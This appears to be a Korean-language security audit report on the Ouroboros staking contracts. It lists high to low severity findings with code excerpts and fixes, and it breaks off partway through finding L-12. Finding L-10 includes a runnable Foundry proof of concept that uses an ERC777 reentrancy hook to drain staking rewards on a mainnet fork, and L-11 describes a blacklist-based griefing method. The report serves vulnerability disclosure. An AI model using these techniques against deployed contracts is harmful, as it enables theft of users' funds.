
# Pashov Audit Group 정보


Pashov Audit Group은 40명 이상의 프리랜서 보안 연구원으로 구성되어 있으며, 이 분야에서 입증된 실력을 갖추고 있습니다. 대부분은 공개 콘테스트 보상으로 10만 달러 이상을 벌었거나, 여러 차례 챔피언에 올랐거나, 우리와의 감사에서 탁월한 성과를 거두었습니다. 우리는 검증되고 의욕적인 인재들과만 함께 일합니다.

300건 이상의 보안 감사를 완료하고 수천 개의 취약점을 발견하여 패치를 도운 이 그룹은 절대적으로 최고의 감사 여정을 만들기 위해 노력합니다. 100% 보안은 결코 보장할 수 없지만, 귀하의 프로젝트를 위해 우리 팀이 최선을 다할 것을 보장합니다.

이전 작업은 [여기](https://github.com/pashov/audits)에서 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 문의하십시오.
    

# 면책 조항


스마트 계약 보안 검토는 취약점의 완전한 부재를 보장할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로, 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장할 수 없으며, 검토를 통해 스마트 계약의 모든 문제를 발견한다고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.


# 소개

<p><strong>Ouroboros-Protocol/Ouroboros_Staking</strong> 저장소에 대한 시간 제한 보안 검토는 Pashov Audit Group에 의해 수행되었으며, <strong>Shaka, 0x37, 0xAlix2</strong>가 참여하여 <strong>Ouroboros</strong>를 검토했습니다. 총 <strong>18</strong>개의 문제가 발견되었습니다.</p>

# Ouroboros 정보

<p>Ouroboros는 USDx와 ORX라는 두 가지 주요 토큰을 가진 차입 및 CDP 스테이블코인 프로토콜입니다. USDx는 TitanX 및 DragonX와 같은 자산을 담보로 사용하는 완전히 담보된 달러 페그 스테이블코인입니다. ORX는 Ouroboros 생태계 내에서 스테이킹 보상 및 수수료 분배를 촉진하는 제한된 공급의 ERC20 토큰입니다. 이 감사의 범위는 Uniswap V3 LP NFT 및 ERC20 토큰에 대한 고급 스테이킹에 중점을 두었으며, Revert Finance의 시간 베스팅 개선 사항을 통합하고 보상 게임을 방지하기 위해 포지션 검증을 시행했습니다. 프로토콜 소유 유동성, 유연한 방출 스타일(즉시, 선형 및 지수 베스팅)을 지원하며 플랫폼 내에서 유동성 및 보상을 직접 관리하기 위한 도구를 포함합니다.</p>

# 보안 평가 요약

**검토 커밋 해시:**<br>• [7ea0311ecabbd8841e4003cbbccf22683c232f18](https://github.com/Ouroboros-Protocol/Ouroboros_Staking/tree/7ea0311ecabbd8841e4003cbbccf22683c232f18)<br>&nbsp;&nbsp;(Ouroboros-Protocol/Ouroboros_Staking)

**수정 검토 커밋 해시:**<br>• [fd1466f548d1260c4dcd53d8c2fc689dc095e693](https://github.com/Ouroboros-Protocol/Ouroboros_Staking/tree/fd1466f548d1260c4dcd53d8c2fc689dc095e693)<br>&nbsp;&nbsp;(Ouroboros-Protocol/Ouroboros_Staking)

# 범위

- `ERC20Staker.sol`
- `EmissionController.sol`
- `UniswapV3Staker.sol`
- `UniswapV3StakerViews.sol`
- `IncentiveId.sol`
- `NFTPositionInfo.sol`
- `RewardMath.sol`
- `TransferHelperExtended.sol`
- `FullRangeZap.sol`

# 발견 사항



# [H-01] 스테이커들이 모든 인센티브를 청구하지 못할 수 있음

_해결됨_

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

UniswapV3Staker에서 소유자는 하나의 인센티브를 생성할 수 있습니다. 고정 틱 범위 포지션을 가진 인센티브의 한 종류가 있습니다. LP 보유자는 자신의 포지션 범위가 이 고정 범위와 일치하는 조건으로 일부 인센티브를 얻을 수 있습니다. readme에 따르면 일반적인 용도는 `전체 범위 포지션(-887220 - 887220)`입니다.

Uniswap v3에서 대부분의 트레이더는 전체 범위 유동성을 선택하지 않습니다. 전체 범위 유동성은 유동성 효율성이 매우 낮기 때문입니다.

LP 보유자로서 v3 스테이커로 얻을 수 있는 수익에는 스왑 수수료, 인센티브 보상 및 가능한 비영구적 손실이 포함됩니다. 전체 범위 유동성과 비교할 때 사용자는 적절한 유동성 범위로 유동성을 제공하는 것을 선호합니다. 동일한 양의 자산이 전체 범위 유동성보다 훨씬 높은 유동성을 제공하여 더 많은 스왑 수수료를 얻을 수 있기 때문입니다.

전체 범위 포지션으로 하나의 인센티브를 생성하면 스테이커는 관련 인센티브 보상을 받기 위해 많은 스왑 수수료를 포기해야 합니다. 이로 인해 더 많은 사용자가 포지션을 스테이킹하지 않게 될 것입니다. 이는 스테이커에게 부작용을 줄 것입니다.

예를 들어:
1. 소유자가 100 DAI 보상으로 하나의 전체 범위 인센티브를 생성합니다.
2. Alice는 전체 범위로 USDC/USDT 풀에 1000 USDC/1000 USDT 유동성을 예치합니다.
3. Bob은 0.98 - 1.02 가격 범위로 USDC/USDT 풀에 1000 USDC/1000 USDT 유동성을 예치합니다.
4. Alice는 v3 스테이커에 자신의 포지션을 스테이킹합니다.

Bob의 유동성은 Alice의 약 100배가 될 것입니다. 실제 가격이 항상 0.98 - 1.02 범위에 있다고 가정해 보겠습니다.
1. Alice의 수익: 1% 미만의 스왑 수수료 + 1 DAI 미만.
2. Bob의 수익: 99% 이상의 스왑 수수료.

```solidity
    function decreaseLiquidity(
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0Min,
        uint256 amount1Min,
        uint256 deadline
    ) external override returns (uint256 amount0, uint256 amount1) {
        // Only the position's owner can decrease liquidity.
        require(deposits[tokenId].owner == msg.sender, 'E020');
    
@>        require(!deposits[tokenId].buildsPOL, 'E024');
    }
    function withdrawToken(
        uint256 tokenId,
        address to,
        bytes memory data
    ) external override {
        // Tokens with POL cannot be withdrawn.
@>        require(!deposit.buildsPOL, 'E024');
    }
    function _calculateAndDistributeRewards(
        IncentiveKey memory key,
        Deposit memory deposit,
        bytes32 incentiveId,
        uint160 secondsPerLiquidityInsideInitialX128,
        uint32 secondsInsideInitial,
        uint128 liquidity
    ) private returns (uint256) {
        Incentive storage incentive = incentives[incentiveId];
        (, uint160 secondsPerLiquidityInsideX128, uint32 secondsInside) =
                                key.pool.snapshotCumulativesInside(deposit.tickLower, deposit.tickUpper);
        ...
    }
```

## 권장 사항

uniswap v3 staker를 참조하십시오. 사용자가 원하는 유동성 범위를 선택할 수 있기 때문에 누구나 이 인센티브에 참여하고 싶어 할 것입니다. 또한 LP 보유자는 v3 스테이커를 통해 추가 인센티브를 받을 수 있습니다.

고정 범위 인센티브 하나를 선택하려면 이 고정 범위를 신중하게 선택해야 합니다. 전체 범위 유동성은 적절하지 않습니다.



# [M-01] USDT는 IERC20Minimal 인터페이스에 적용할 수 없음

_해결됨_

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명

사용자가 유동성을 늘리고 싶을 때 `_executeLiquidityIncrease` 함수를 통해 유동성을 수행할 수 있습니다. `_executeLiquidityIncrease` 함수에서는 UniswapV3Staker로 자산을 이체한 다음 자산 토큰을 `nonfungiblePositionManager`에 승인합니다.
여기서 문제는 USDT 토큰이 `IERC20Minimal(token0).approve` 인터페이스를 지원하지 않는다는 것입니다. 이로 인해 이 트랜잭션이 되돌려집니다.

FunnRangeZap에서는 USDT 케이스를 처리하기 위해 몇 가지 특수 로직을 추가했습니다. UniswapV3Staker에서도 USDT 케이스를 처리해야 합니다.

```solidity
    function _executeLiquidityIncrease(
        uint256 tokenId,
        uint256 amountAdd0,
        uint256 amountAdd1,
        uint256 amount0Min,
        uint256 amount1Min,
        uint256 deadline
    ) private returns (uint128 liquidity, uint256 amount0, uint256 amount1) {
        (, , address token0, address token1, , , , , , , , ) =
            nonfungiblePositionManager.positions(tokenId);
        // Transfer assets token0, token1 to this contract.
        TransferHelperExtended.safeTransferFrom(token0, msg.sender, address(this), amountAdd0);
        TransferHelperExtended.safeTransferFrom(token1, msg.sender, address(this), amountAdd1);
        // approve to the NPM.
        // @audit-issue it's possible to be revert here ???
        IERC20Minimal(token0).approve(address(nonfungiblePositionManager), amountAdd0);
        IERC20Minimal(token1).approve(address(nonfungiblePositionManager), amountAdd1);
    }
```

## 권장 사항

USDT를 지원하려면 safeApprove를 사용하십시오.



# [L-01] `ERC20Staker`가 잠긴 인센티브 데이터를 노출하지 않음

_해결됨_

`ERC20Staker`는 `_lockedIncentives` 세트와 `_tokenLockedIncentives` 매핑을 사용하여 잠긴 인센티브를 추적합니다.

```solidity
70:     // Tracks all locked incentives for efficient querying
71:     EnumerableSet.Bytes32Set private _lockedIncentives;
72:     // Tracks locked incentives by staking token
73:     mapping(IERC20Minimal => EnumerableSet.Bytes32Set) private _tokenLockedIncentives;
```

코드에서 이러한 변수의 사용은 인센티브 ID 추가 및 제거로 제한되므로 외부 소비에 사용될 것으로 예상됩니다. 그러나 변수는 비공개이며 액세스할 수 있는 공개 또는 외부 함수가 없습니다.

`_lockedIncentives` 및 `_tokenLockedIncentives`의 값을 검색하는 외부 함수를 추가하는 것이 좋습니다.



# [L-02] `NFTPositionInfo`가 ZKSync에서 제대로 작동하지 않음

_인정됨_

계약은 UniswapV3가 배포된 모든 네트워크 배포될 수 있어야 합니다. 그러나 ZKSync에서는 사용하는 `PoolAddress` 버전이 [ZKSync와 호환되지 않으므로](https://github.com/uniswap-zksync/era-uniswap-v3-periphery/blob/v1.0.1-zksync-era/contracts/libraries/PoolAddress.sol) `NFTPositionInfo` 라이브러리가 제대로 작동하지 않습니다.

이로 인해 `NFTPositionInfo.getPositionInfo()`가 잘못된 풀 주소를 반환하여 포지션 스테이킹 시 되돌려질 수 있습니다.

ZKSync에 계약을 배포하려는 경우 ZKSync의 `PoolAddress` 라이브러리를 사용하여 새 버전의 `NFTPositionInfo`를 생성하는 것을 고려하십시오.



# [L-03] `UniswapV3Staker` 계약이 메인넷 배포의 크기 제한을 초과함

_해결됨_

`UniswapV3Staker` 계약이 메인넷 배포의 크기 제한을 초과합니다. 최적화 프로그램 실행을 1로 설정해도 런타임 크기는 24.05 KiB인 반면 제한은 24 KiB입니다.

```bash
yarn run size-contracts

(...)

 ·-------------------------------------------------------------------------------|-------------·
 |  Contract Name                                                                ·  Size (Kb)  │
 ················································································|··············
(...)
 ················································································|··············
 |  contracts/UniswapV3Staker.sol:UniswapV3Staker                                ·      24.05  │
 ·-------------------------------------------------------------------------------|-------------·

 Warning: 1 contracts exceed the size limit for mainnet deployment.
```

메인넷 배포를 위해 24 KiB 제한 내에 맞도록 `UniswapV3Staker` 계약의 크기를 줄여야 합니다.



# [L-04] 0 승인을 지원하지 않는 토큰으로 포지션 생성 실패

_인정됨_

FullRangeZap에서는 USDT의 승인 흐름을 처리하기 위해 승인을 0으로 재설정합니다. 그러나 BNB 토큰과 같이 0 승인을 지원하지 않는 일부 토큰이 있습니다. 이로 인해 명시적 승인이 되돌려집니다.
```solidity
    function _createAndStakePosition(
        ZapParams memory params,
        PositionAmounts memory amounts,
        IUniswapV3Staker.IncentiveKey memory incentiveKey,
        uint256 deadline
    ) private returns (uint256 tokenId, uint256 amount0, uint256 amount1) {
        ...
        if (amount0 < amounts.token0Amount) {
            TransferHelper.safeApprove(params.token0, address(nonfungiblePositionManager), 0);
        }

        if (amount1 < amounts.token1Amount) {
            TransferHelper.safeApprove(params.token1, address(nonfungiblePositionManager), 0);
        }
    }
```

권장 사항: forceApprove 사용 제안
```solidity
    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        bytes memory approvalCall = abi.encodeCall(token.approve, (spender, value));

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(token, abi.encodeCall(token.approve, (spender, 0)));
            _callOptionalReturn(token, approvalCall);
        }
    }
```



# [L-05] 해시에 `emissionSettings`가 없어 발생하는 인센티브 ID 충돌

_해결됨_

`ERC20Staker`에서 각 ERC20 스테이킹 인센티브는 `computeERC20IncentiveId`를 통해 계산된 결정적 해시를 사용하여 고유하게 식별됩니다.

```solidity
function computeERC20IncentiveId(
    IERC20Minimal rewardToken,
    IERC20Minimal stakingToken,
    uint256 reward,
    uint256 startTime,
    uint256 endTime,
    address refundee,
    bool isLocked
) public pure returns (bytes32 incentiveId) {
    return keccak256(
        abi.encode(
            rewardToken,
            stakingToken,
            reward,
            startTime,
            endTime,
            refundee,
            isLocked
        )
    );
}
```

그러나 해시는 `ERC20IncentiveKey` 구조체의 `emissionSettings` 필드를 포함하지 않습니다. 결과적으로:

* **동일한 토큰 매개변수**를 갖지만 **다른 방출 스타일, 기간, 절벽 또는 스테이징 기간**을 가진 두 인센티브는 **동일한 인센티브 ID**를 생성합니다.
* 이로 인해 `erc20Incentives`에서 충돌이 발생하고 인센티브 격리 보장이 깨집니다.
* 두 번째 인센티브 생성은 다음으로 인해 실패합니다.

  ```solidity
  require(erc20Incentives[incentiveId].totalRewardUnclaimed == 0, ...);
  ```

이 문제는 여러 방출 스타일을 지원함으로써 약속된 유연성을 깨뜨립니다.

서로 다른 방출 매개변수를 가진 인센티브가 별개로 처리되도록 인센티브 ID 해시에 인코딩된 `emissionSettings`를 포함하는 것을 고려하십시오.

```diff
return keccak256(
    abi.encode(
        rewardToken,
        stakingToken,
        reward,
        startTime,
        endTime,
        refundee,
        isLocked,
+       key.emissionSettings.emissionStyle,
+       key.emissionSettings.period,
+       key.emissionSettings.cliff,
+       key.emissionSettings.stagingDuration
    )
);
```



# [L-06] 비활성 인센티브는 전체 보상 고갈 후 제거되지 않음

_해결됨_

`_activeIncentives` 및 `_lockedIncentives` 세트는 진행 중인 ERC20 스테이킹 및 잠긴 인센티브를 추적하기 위한 것입니다. 그러나 이 세트는 소유자가 명시적으로 `endERC20Incentive`를 호출할 때만 업데이트됩니다. 모든 보상이 청구되고 `endERC20Incentive`가 호출되지 않으면 인센티브는 기능적으로 비활성 상태임에도 불구하고 이러한 세트에 남아 있습니다.

또한 다음 확인으로 인해 모든 보상이 고갈되면 `endERC20Incentive`를 호출할 수 없습니다.
```solidity
require(incentive.totalRewardUnclaimed > 0, "ERC20Staker::endERC20Incentive: non-existent incentive");
````

이로 인해 `getActiveIncentivesPaginated`에 오래된 항목이 생겨 이미 모든 보상을 배포하고 더 이상 활성 상태가 아닌 인센티브가 반환될 수 있습니다.

이 문제는 `UniswapV3Staker`의 `activeIncentives`에도 존재합니다.

`totalRewardUnclaimed == 0` 및 `totalStaked == 0`일 때 `_activeIncentives`(및 해당되는 경우 `_lockedIncentives`)에서 인센티브를 제거하는 자동 정리 메커니즘을 `unstakeERC20`에 도입하여 최종 사용자가 언스테이크한 후 적절한 상태 위생을 보장하는 것을 고려하십시오.



# [L-07] `unstakeERC20` 및 `claimERC20Reward`에서 잘못된 보상 값 반환

_해결됨_

사용자가 `ERC20Staker` 계약에 ERC20 토큰을 스테이킹하면 시간이 지남에 따라 보상이 누적됩니다. 이러한 보상은 두 가지 방법으로 청구할 수 있습니다.
1. `unstakeERC20`을 호출하여 보상을 청구하고 토큰을 언스테이크합니다.
2. `claimERC20Reward`를 호출하여 언스테이킹 없이 보상을 청구합니다.

두 함수 모두 유사한 보상 청구 흐름을 따릅니다.
```solidity
// Update rewards before changing stake
_updateReward(msg.sender, incentiveId);

// Get earned rewards
reward = stake.rewards;

// Reset rewards since we're distributing them
stake.rewards = 0;

// ... snip ...

// Distribute rewards
uint256 actualReward = _distributeERC20Reward(incentiveId, msg.sender, reward);

// ... snip ...

return reward;
````

그러나 `_distributeERC20Reward` 함수는 보상 금액을 수정할 수 있습니다(예: 인센티브가 종료된 경우).

```solidity
if (reward > incentive.totalRewardUnclaimed) {
    reward = incentive.totalRewardUnclaimed;
}
```

그럼에도 불구하고 `unstakeERC20` 및 `claimERC20Reward`는 수정된 `actualReward` 대신 원래 `reward` 변수를 반환하여 사용자에게 실제로 전송된 것과 일치하지 않을 수 있는 부정확한 반환 값을 초래합니다.


두 함수 모두 `actualReward` 값을 반환하도록 업데이트하여 배포된 금액을 정확하게 반영하는 것을 고려하십시오.

```diff
-return reward;
+return actualReward;
```



# [L-08] `UniswapV3Staker`에서 `stagingDuration`에 대한 유효성 검사 누락

_해결됨_

`UniswapV3Staker.createIncentive`에서 `stagingDuration` 매개변수는 방출 스타일이 `Vested`인 경우에만 유효성이 검사되고 `Dripped`인 경우에는 검사되지 않습니다. 이는 `Dripped` 및 `Vested` 방출 모두 `stagingDuration`을 지원한다는 문서와 일치하지 않습니다.

결과적으로 잘못된 값(예: 과도한 기간)이 `Dripped` 방출에 대해 설정되어 보상 청구 중에 예상치 못한 동작이 발생할 수 있습니다. 이 문제는 두 방출 스타일에 대해 `stagingDuration`을 올바르게 검증하는 `ERC20Staker.createERC20Incentive`에서는 방지됩니다.


방출 스타일이 `Regular`가 아닌 한 `Dripped`인지 `Vested`인지에 관계없이 `stagingDuration`을 검증하도록 `UniswapV3Staker.createIncentive`를 업데이트하는 것을 고려하십시오.



# [L-09] 인센티브 종료 시 오래된 보상 발생 및 방출 방지 실패

_해결됨_

사용자는 `ERC20Staker`에 ERC20 토큰을 스테이킹하여 사전 정의된 인센티브 기간 동안 배포되는 다른 ERC20 토큰으로 보상을 받을 수 있습니다. 계약은 인센티브 소유자가 `endTime` + 유예 기간이 지난 후 인센티브를 종료할 수 있도록 허용합니다. 이 경우 청구되지 않은 모든 보상은 인센티브 소유자에게 전송되며 사용자는 스테이킹된 토큰만 인출할 수 있으며 더 이상의 보상을 받거나 청구할 수 없습니다.

인센티브 종료 시 다음이 발생합니다.
```solidity
// Refund is the remaining unclaimed amount
refund = incentive.totalRewardUnclaimed;

// Reset incentive data
incentive.totalRewardUnclaimed = 0;
````

그러나 이 상태 변경은 두 곳에서 제대로 처리되지 않습니다.

1. **보상 뷰 부정확성**:
   `getERC20RewardInfo` 및 `getERC20StakesPaginated` 함수는 인센티브가 종료된 후에도 `earnedReward > 0`을 계속 보고합니다. 이는 `earned()` 함수가 청구되지 않은 보상이 남아 있는지 확인하지 않고 시간과 요율만을 기준으로 보상을 계산하기 때문입니다. 결과적으로 UI 또는 통합자는 사용자에게 청구할 수 없는 잘못된 보상을 표시할 수 있습니다.

2. **잘못된 보상 분배 경로**:
   `unstakeERC20()`에서 보류 중인 보상은 `_distributeERC20Reward()`를 통해 분배됩니다. 먼저 보상이 0인지 확인합니다.

   ```solidity
   if (reward == 0) {
       return 0;
   }
   ```

   그런 다음 `incentive.totalRewardUnclaimed`에 대해 보상을 제한합니다. 그러나 인센티브가 이미 종료되었으므로 `totalRewardUnclaimed`는 0으로 재설정되었으므로 이 제한은 조용히 시행됩니다. 방출 스타일이 비정규(Non-Regular)인 경우 로직은 0 보상으로 새 방출 항목을 생성합니다. 이러한 방출은 사실상 비어 있으며 결코 청구할 수 없습니다.

   이 문제는 `UniswapV3Staker::_distributeReward`에도 존재합니다.

인센티브가 종료되고 청구되지 않은 보상이 환불되면 더 이상의 보상을 관찰하거나 분배할 수 없도록 하십시오.

1. `getERC20RewardInfo` 및 `getERC20StakesPaginated`에서 보상 계산을 `totalRewardUnclaimed`로 제한합니다.

```diff
-earnedReward = earned(user, incentiveId); 
+earnedReward = incentive.totalRewardUnclaimed == 0 ? 0 : earned(user, incentiveId);
```

2. `_distributeERC20Reward`에서 `reward == 0` 검사를 `totalRewardUnclaimed`에 대한 제한 **직후**로 이동합니다.

```diff
-if (reward == 0) {
-    return 0;
-}
-
ERC20Incentive storage incentive = erc20Incentives[incentiveId];

// Cap reward at available unclaimed amount
if (reward > incentive.totalRewardUnclaimed) {
    reward = incentive.totalRewardUnclaimed;
}
+
+if (reward == 0) {
+    return 0;
+}
```

이를 통해 유령 보상이 노출되지 않고 빈 방출이 생성되지 않습니다.



# [L-10] `UniswapV3Staker`의 ERC777 보상으로 재진입 유출 허용

_해결됨_

`UniswapV3Staker._unstakeToken()`은 스테이크 스토리지를 정리하기 전에 보상을 계산하고 분배합니다.

방출 스타일이 `Regular`이고 보상 토큰이 ERC777 토큰인 경우 계약에 재진입하여 동일한 토큰을 다시 언스테이크하여 스토리지가 정리되기 전에 동일한 보상을 여러 번 분배하여 공격자가 계약에서 보상 토큰의 모든 잔액을 유출할 수 있습니다.

```solidity
477:     function _unstakeToken(IncentiveKey memory key, uint256 tokenId, Deposit memory deposit) private returns (uint256 reward) {
(...)
488:  @>     reward = _calculateAndDistributeRewards(
489:             key,
490:             deposit,
491:             incentiveId,
492:             secondsPerLiquidityInsideInitialX128,
493:             secondsInsideInitial,
494:             liquidity
495:         );
496: 
497:         _cleanupStakeStorage(tokenId, incentiveId, liquidity);
(...)
627:     function _distributeReward(
(...)
634:         if (incentive.emissionSettings.emissionStyle == IEmissionController.EmissionStyle.Regular) {
635:  @>         TransferHelperExtended.safeTransfer(address(key.rewardToken), owner, reward);
```

개념 증명

- [프로젝트에 Foundry 설정](https://getfoundry.sh/introduction/installation).
- 아래 코드로 `test/foundry` 디렉토리에 테스트 파일을 생성합니다.
- `forge test --mt test_audit_erc777RewardReentrancy --fork-url https://eth.llamarpc.com --fork-block-number 22866702` 실행.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "contracts/UniswapV3Staker.sol";
import "contracts/zaps/FullRangeZap.sol";
import "contracts/interfaces/IUniswapV3Staker.sol";
import "@openzeppelin/contracts/introspection/IERC1820Registry.sol";

contract AuditTests is Test {
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    
    INonfungiblePositionManager positionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IUniswapV3Factory factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    IUniswapV3Pool pool = IUniswapV3Pool(0x98409d8CA9629FBE01Ab1b914EbF304175e384C8); // WETH/VRA pool
    IERC20Minimal WETH = IERC20Minimal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Minimal VRA = IERC20Minimal(0xF411903cbC70a74d22900a5DE66A2dda66507255);
    IERC1820Registry ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    
    UniswapV3Staker staker;
    FullRangeZap zap;
    IUniswapV3Staker.IncentiveKey incentiveKey;
    uint256 reward = 1_000e18;
    uint256 tokenId;
    uint256 timesReentered;

    function setUp() public {
        deal(address(VRA), owner, reward);
        incentiveKey = IUniswapV3Staker.IncentiveKey({
            rewardToken: VRA,
            pool: pool,
            reward: reward,
            startTime: block.timestamp,
            endTime: block.timestamp + 30 days,
            vestingPeriod: 0,
            refundee: address(this),
            rangeSettings: IUniswapV3Staker.RangeSettings({
                hasTickRange: false,
                rangeType: IUniswapV3Staker.RangeType.Fixed,
                requiredTickLower: 0,
                requiredTickUpper: 0,
                hasMinWidth: false,
                minTickWidth: 0,
                buildsPOL: false
            }),
            emissionSettings: IEmissionController.EmissionSettings({
                emissionStyle: IEmissionController.EmissionStyle.Regular,
                period: 0,
                cliff: 0,
                stagingDuration: 0,
                isForfeitable: false
            })
        });

        // Owner deploys contracts and creates incentive
        vm.startPrank(owner);
        staker = new UniswapV3Staker(
            factory,
            positionManager,
            30 days,
            365 days
        );

        zap = new FullRangeZap(
            staker,
            factory,
            positionManager,
            ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564),
            IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6)
        );

        VRA.approve(address(staker), reward);
        staker.createIncentive(incentiveKey);
        vm.stopPrank();
    }

    function test_audit_erc777RewardReentrancy() public {
        uint256 wethAmount = 1_000e18;
        deal(address(WETH), address(this), wethAmount);
        deal(address(WETH), alice, wethAmount);

        FullRangeZap.ZapInput memory input = FullRangeZap.ZapInput({
            incentiveKey: incentiveKey,
            inputToken: WETH,
            inputAmount: wethAmount,
            pool: pool,
            minSwapToken0: 0,
            minSwapToken1: 0,
            minLiquidityToken0: 1,
            minLiquidityToken1: 1,
            deadline: block.timestamp
        });

        // Registers the contract as an ERC777TokensRecipient
        ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );

        // Create and stake a position
        WETH.approve(address(zap), wethAmount);
        tokenId = zap.zap(input);

        // Alice also creates and stakes a position
        vm.startPrank(alice);
        WETH.approve(address(zap), wethAmount);
        uint256 tokenIdAlice = zap.zap(input);
        vm.stopPrank();

        // Adjust so that both positions have the same liquidity
        (,,,,,,, uint256 liquidity, , , , ) = positionManager.positions(tokenId);
        (,,,,,,, uint256 liquidityAlice, , , , ) = positionManager.positions(tokenIdAlice);
        if (liquidity > liquidityAlice) {
            staker.decreaseLiquidity(
                tokenId,
                uint128(liquidity - liquidityAlice),
                0,
                0,
                block.timestamp
            );
        } else {
            vm.prank(alice);
            staker.decreaseLiquidity(
                tokenIdAlice,
                uint128(liquidityAlice - liquidity),
                0,
                0,
                block.timestamp
            );
        }
        (,,,,,,, liquidity, , , , ) = positionManager.positions(tokenId);
        (,,,,,,, liquidityAlice, , , , ) = positionManager.positions(tokenIdAlice);
        assertEq(liquidity, liquidityAlice, "Liquidity mismatch after decrease");

        // Incentive period passes
        skip(30 days);

        // Unstake position. When VRA rewards are received, `tokensReceived()` is called,
        // which reenters `staker.unstakeToken()` and claims rewards again.
        (uint256 expectedReward,,) = staker.getRewardInfo(incentiveKey, tokenId);
        uint256 vraBalanceBefore = VRA.balanceOf(address(this));
        staker.unstakeToken(incentiveKey, tokenId);
        uint256 vraBalanceDiff = VRA.balanceOf(address(this)) - vraBalanceBefore;
        // Most of the VRA rewards have been claimed.
        assert(vraBalanceDiff == expectedReward * 3);
        assert(vraBalanceDiff > reward * 90 / 100);
        
        // Alice unstakes her position, but it reverts, as there are is not enough VRA left.
        (uint256 expectedRewardAlice,,) = staker.getRewardInfo(incentiveKey, tokenIdAlice);
        uint256 vraBalanceStaker = VRA.balanceOf(address(staker));
        assert(vraBalanceStaker < expectedRewardAlice);
        vm.prank(alice);
        vm.expectRevert();
        staker.unstakeToken(incentiveKey, tokenIdAlice);
    }

    // ERC777TokensRecipient interface implementation
    // Called when VRA is received
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        if (from == address(staker) && amount > 0 && timesReentered < 2) {
            // Reenter unstakeToken() just twice (avoid infinite recursion)
            timesReentered++;
            staker.unstakeToken(incentiveKey, tokenId);
        }
    }
}
```

**권장 사항**

보상 계산 및 분배 전에 스테이크 스토리지를 정리하십시오.



# [L-11] `endIncentive`가 차단될 수 있음

_인정됨_

UniswapV3Staker에서 소유자는 하나의 인센티브를 생성할 수 있습니다. 이 인센티브가 종료되면 `endIncentive` 함수를 통해 이 인센티브를 종료할 수 있습니다. `endIncentive` 함수에서 청구되지 않은 보상을 환불할 수 있습니다.

`endIncentive` 함수에서 청구되지 않은 자산을 환불하기 위해 이 인센티브를 종료하려면 모든 참가자가 이미 이 인센티브로 언스테이크했는지 확인해야 합니다. 인센티브가 종료되면 누구나 참가자가 이 인센티브를 언스테이크하도록 도울 수 있습니다.

여기서 문제는 `unstakeToken` 함수에서 누적된 보상을 계산하고 보상을 분배한다는 것입니다. 방출 스타일이 정규(regular)인 경우 자산을 소유자에게 직접 이체합니다.

보상 토큰이 USDC/USDT 토큰인 경우 USDC/USDT의 블랙리스트로 인해 unstake 함수가 되돌려질 수 있습니다. 이로 인해 endIncentive가 차단됩니다. 소유자는 나머지 자산을 검색할 수 없습니다.

악의적인 사용자가 인센티브로 스테이크하기 위해 아주 작은 유동성을 생성한 다음 포지션을 블랙리스트 사용자에게 이체할 수 있습니다.
```solidity
    function _unstakeToken(IncentiveKey memory key, uint256 tokenId, Deposit memory deposit) private returns (uint256 reward) {
        bytes32 incentiveId = IncentiveId.compute(key);

        (uint160 secondsPerLiquidityInsideInitialX128, uint32 secondsInsideInitial, uint128 liquidity) =
                        _getAndValidateStake(tokenId, incentiveId);
        // @note-ok when we unstake one incentives, should we clear the POL flag ???
        _updateStakeCounts(tokenId, incentiveId);
        userERC721Stakes[deposit.owner][tokenId].remove(incentiveId);
        // remove this token from this incentive.
        incentiveTokens[incentiveId].remove(tokenId);
        // When we unstake, we can calculate the incentive rewards.
@>        reward = _calculateAndDistributeRewards(
            key,
            deposit,
            incentiveId,
            secondsPerLiquidityInsideInitialX128,
            secondsInsideInitial,
            liquidity
        );
        ...
    }
    function _calculateAndDistributeRewards(
        IncentiveKey memory key,
        Deposit memory deposit,
        bytes32 incentiveId,
        uint160 secondsPerLiquidityInsideInitialX128,
        uint32 secondsInsideInitial,
        uint128 liquidity
    ) private returns (uint256) {
        ...
        // Distribute rewards based on emission style
        _distributeReward(key, incentiveId, incentive, deposit.owner, reward);

    }
    function _distributeReward(
        IncentiveKey memory key,
        bytes32 incentiveId,
        Incentive storage incentive,
        address owner,
        uint256 reward
    ) private {
        // If the emssion controller is regular, users can claim reward directly.
        if (incentive.emissionSettings.emissionStyle == IEmissionController.EmissionStyle.Regular) {
@>            TransferHelperExtended.safeTransfer(address(key.rewardToken), owner, reward);
            emit RewardClaimed(key.rewardToken, owner, reward);
        }
    }
```

**권장 사항**

정규 방출 스타일을 선택하는 경우 보상을 기록하고 사용자가 새 인터페이스를 통해 보상을 청구할 수 있도록 하십시오.



# [L-12] `resetERC20Lock()` 설계 결함: 재스테이크 시 자동 초기화 필요

_인정됨_

이전에 보고된 문제 [L-07](https://github.com/PashovAuditGroup/Ouroboros_June25_MERGED/issues/12)은 계약 소유자가 `releaseERC20Lock()`을 호출한 후 잠금을 다시 부과할 수 있도록 `resetERC20Lock()` 함수를 도입할 것을 제안했습니다. 해당 보고서는 누락된 잠금 복구 경로를 올바르게 식별했지만 제안되고 구현된 솔루션은 **부적절한 권한 모델**을 도입했습니다.

